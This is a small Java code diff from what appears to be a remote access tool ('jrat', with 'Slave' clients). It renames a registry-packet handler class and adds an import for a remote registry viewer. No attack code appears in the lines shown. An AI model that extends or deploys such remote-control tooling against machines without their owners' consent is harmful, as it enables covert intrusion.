@@ -4,11 +4,13 @@ import com.redpois0n.pathtree.FolderTreeNode;
 import com.redpois0n.pathtree.PathTreeNode;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.module.registry.ui.FrameRemoteRegistry;
+
 import java.io.DataInputStream;
 import javax.swing.ImageIcon;
 import javax.swing.tree.TreePath;
 
-public class Packet54Registry extends AbstractIncomingPacket {
+public class PacketResult extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
@@ -55,7 +57,5 @@ public class Packet54Registry extends AbstractIncomingPacket {
 				}
 			}
 		}
-
 	}
-
 }
